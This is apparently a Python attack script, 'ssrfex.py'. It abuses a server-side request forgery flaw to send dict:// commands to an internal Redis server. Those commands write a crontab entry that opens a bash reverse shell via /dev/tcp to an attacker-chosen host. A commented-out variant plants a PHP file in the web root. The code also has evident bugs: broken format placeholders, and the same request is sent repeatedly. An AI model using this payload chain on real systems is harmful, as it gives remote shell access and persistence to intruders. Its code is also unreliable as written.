#encoding : utf-8

#6378 redis port to get redis-server shell
import argparse,requests
from lib.config import logging


def main(args):

    url = args.url
    redis_ip = args.redis_ip
    bip = args.bip
    bport = args.bport
    logging.info("Starting to connect redis_ip and exec redis command.....")
    #ubuntu /etc/crontab
    #centos /var/spool/cront/root
    #debain /var/spool/cron/crontabs/root
    #set 0 "\n\n\n\n* * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n\n\n"
    payload1 = "http://{target}dict://{ip}:6379/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20>\\x26\\x20/dev/tcp/{$bip}/{$bport}\\x200>\\x261\\x0a\\x0a\\x0a\ ".format(target=url,ip=redis_ip,bip=bip,bport=bport)
    r1 = requests.get(payload1).content
    if r1:
        print(r1)
    #config set dir /etc
    payload2 = "http://{target}dict://{ip}:6379/data=config:set:dir:/etc".format(target=url,ip=redis_ip)
    r2 = requests.get(payload2).content
    if r2:
        print(r2)
    #config set dbfilename crontab
    payload3 = "http://{target}dict://{ip}:6379/data=config:set:dbfilename:crontab".format(target=url,ip=redis_ip)
    r3 = requests.get(payload2).content
    if r3:
        print(r3)
    #save
    payload4 = "http://{target}dict://{ip}:6379/data=save".format(target=url,ip=redis_ip)
    r4 = requests.get(payload2).content
    if r4:
        print(r4)
        
    '''
    #web service running in server
    #config set dir /var/www/html
    payload1 = "http://{target}dict://{ip}:6379/data=config:set:dir:/var/www/html".format(target=url,ip=redis_ip)
    #config set dbfilename redis.php
    payload2 = "http://{target}dict://{ip}:6379/data=config:set:dbfilename:redis.php".format(target=url,ip=redis_ip)
    #set webshell "<?php phpinfo(); ?>"
    payload3 = "http://{target}dict://{ip}:6379/data=set:webshell:\"<?php\\x20phpinfo();\\x20?>\"".format(target=url,ip=redis_ip)
    #save
    payload4 = "http://{target}dict://{ip}:6379/data=save".format(target=url,ip=redis_ip)
    
    '''

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='ssrfex.py', usage='%(prog)s -u [host and parameter] -i [redis_ip] -bip [bip] -bport [bport]',
                                     description='ssrf test')
    parser.add_argument("-u", dest="target", type=str, help="url targrt")
    parser.add_argument("-i", dest="redis_ip", type=str, help="redis_ip")
    parser.add_argument("-bip",dest="bip",type=str,help="shell connect ip address")
    parser.add_argument("-bport",dest="bport",type=str,help="shell connect port")
    args = parser.parse_args()

    try:
        main(args)
    except Exception as e:
        logging.error(str(e))
        exit(1)
